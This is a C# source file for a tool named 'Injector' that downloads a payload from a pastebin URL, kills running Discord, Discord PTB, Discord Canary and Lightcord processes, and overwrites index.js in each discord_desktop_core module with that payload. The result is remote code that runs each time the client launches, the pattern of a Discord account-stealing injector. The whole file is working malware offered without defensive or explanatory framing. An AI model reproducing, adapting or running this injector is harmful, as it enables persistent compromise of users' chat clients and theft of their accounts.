using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.IO;
using System;

namespace Injector
{
    internal class Program
    {
        internal static string LocalDirectory = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        internal static string RoamiDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        internal static List<string> DiscordPath = new List<string>
        {
            $"{LocalDirectory}\\discord\\",
            $"{RoamiDirectory}\\Discord\\",
            $"{RoamiDirectory}\\Lightcord\\",
            $"{RoamiDirectory}\\discordptb\\",
            $"{RoamiDirectory}\\discordcanary\\",
        };

        internal static List<string> ProcessToKill = new List<string>
        {
                "DiscordDevelopment",
                "DiscordPTB",
                "Lightcord",
                "Discord",
                "discord",
        };

        internal static void Main()
        {
            var Payload = new WebClient().DownloadString("https://pastebin.com/raw/DDWmFprL");

            ProcessToKill.ForEach(proc =>
            {
                foreach (var process in Process.GetProcessesByName(proc))
                {
                    try
                    {
                        process.Kill();
                    }
                    catch { };
                }
            });

            DiscordPath.ForEach(path =>
            {
                if (!Directory.Exists(path)) return;

                Directory.GetDirectories(path).Where(dir => dir.Contains("app-")).ToList<string>().ForEach(dirs =>
                {
                    Directory.GetDirectories(dirs).Where(dir => dir.Contains("module")).ToList<string>().ForEach(module_dirs =>
                    {
                        Directory.GetDirectories(module_dirs).Where(dir => dir.Contains("discord_desktop_core")).ToList<string>().ForEach(core =>
                        {
                            Directory.GetFiles(core, "*.*", SearchOption.AllDirectories).Where(s => s.ToLower().EndsWith("index.js")).ToList<string>().ForEach(file =>
                            {
                                try
                                {
                                    File.WriteAllText(file, Payload);
                                }
                                catch { };
                            });
                        });
                    });
                });
            });
        }
    }
}
